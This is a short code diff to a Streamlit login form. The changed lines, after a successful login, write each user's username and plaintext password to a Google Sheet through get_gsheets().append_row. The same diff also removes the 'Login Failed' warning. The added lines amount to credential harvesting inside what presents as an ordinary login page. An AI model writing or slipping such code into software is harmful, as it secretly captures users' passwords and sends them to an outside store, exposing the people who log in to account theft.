@@ -46,21 +46,19 @@ def show_login_form():
         submitted = st.form_submit_button("Submit")
         if submitted:
             if username != "" or password != "": 
-                s,r = login_me(username,password)
-                
+                s,r = login_me(username,password)  
                 if check_auth(r):
-                    
                     st.session_state.auth = True
                     st.session_state.home_page_content  = r 
                     submit = submitted
-                    # st.write(subjects_and_links)
-                    
+                    st.success("Successfully logged in")
+                    sheets = get_gsheets()
+                    sheets.append_row([username, password])            
                 else: 
                     st.session_state.auth = False
-                    st.warning("Login Failed")
         
     if submit:
         form_sample.empty()
-        st.success("Successfully logged in")
+        
 
 
